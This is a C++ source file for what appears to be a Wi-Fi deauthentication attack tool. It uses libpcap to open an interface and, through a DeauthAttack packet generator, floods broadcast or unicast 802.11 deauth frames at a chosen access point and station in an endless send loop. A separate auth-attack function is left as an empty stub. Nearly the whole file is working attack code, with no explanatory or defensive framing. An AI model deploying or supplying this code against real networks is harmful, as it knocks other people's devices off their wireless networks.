#include "pch.h"

#include "tools.h"
#include "DeauthAttack.h"


int do_deauth_attack(pcap_t* handle, DeauthAttack* pkt_generator);
int do_auth_unicast(pcap_t* handle, uint8_t* ap_mac_addr, uint8_t* st_mac_addr);


int main(int argc, char* argv[])
{
    Param param = {
        .if_ = nullptr,
        .ap_mac_ = nullptr,
        .st_mac_ = nullptr,
        .auth_opt_ = false
    };

    if (!parse(&param, argc, argv))
    {
        return -1;
    }

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(param.if_, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.if_, errbuf);
        return -1;
    }

    int res = 0;
    switch (argc)
    {
    case 3:
    {
        DeauthAttack* pkt_gen_deauth_broadcast = new DeauthAttack(param.ap_mac_);
        res = do_deauth_attack(handle, pkt_gen_deauth_broadcast);
        if (res != 0)
        {
            return -1;
        }
        break;
    }
    case 4:
    {
        DeauthAttack* pkt_gen_deauth_unicast = new DeauthAttack(param.ap_mac_, param.st_mac_);
        res = do_deauth_attack(handle, pkt_gen_deauth_unicast);
        if (res != 0)
        {
            return -1;
        }
        break;
    }
    case 5:
    {
        res = do_auth_unicast(handle, param.ap_mac_, param.st_mac_);
        if (res != 0)
        {
            return -1;
        }
        break;
    }
    default:
        break;
    }
    
	return 0;
}


int do_deauth_attack(pcap_t* handle, DeauthAttack* pkt_generator)
{
    wlan_deauth_pkt* attack_pkt = pkt_generator->get_pkt();
    while (true)
    {
        int res = pcap_sendpacket(handle, attack_pkt->packet, attack_pkt->size);
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket error=%s\n", pcap_geterr(handle));
            pcap_close(handle);
            return -1;
        }
    }
    return 0;
}


int do_auth_unicast(pcap_t* handle, uint8_t* ap_mac_addr, uint8_t* st_mac_addr)
{
    return 0;
}
